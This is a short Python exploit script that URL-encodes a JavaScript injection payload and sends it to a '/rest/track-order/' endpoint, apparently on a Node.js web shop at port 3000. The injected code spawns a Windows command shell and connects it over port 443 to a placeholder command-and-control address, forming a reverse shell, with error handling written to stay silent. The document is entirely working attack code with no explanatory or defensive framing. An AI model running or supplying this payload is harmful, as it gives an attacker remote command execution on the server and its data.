#!/usr/bin/python3
import sys
import requests
import logging
import urllib

HOST = 'http://<host>:3000'

command = """
if (typeof global.hasRun === 'undefined' || global.hasRun === false) {
    global.hasRun = true;
    var require = this.process.mainModule.require;
    var net = require('net');
    var cmdPath = process.env.COMSPEC || 'cmd.exe';
    var sh = require('child_process').spawn(cmdPath, [], {});
    sh.on('error', function(err) {
        // Optionally, handle the error silently or log it in a different way
    });

    sh.on('exit', function() {
        global.hasRun = false; // Reset hasRun when the process exits
    });

    var client = new net.Socket();
    client.on('error', function(err) {
        // Suppress the error logging
        global.hasRun = false; // Reset hasRun if connection fails
    });

    client.connect(443, "<YOUR_CC_SERVER_IP_ADDRESS>", function() {
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
}
"""

payload = f"' || (function() {{ {command} }})(); //"

encoded = urllib.parse.quote(payload, safe='')
r = requests.get(HOST + "/rest/track-order/" + encoded)
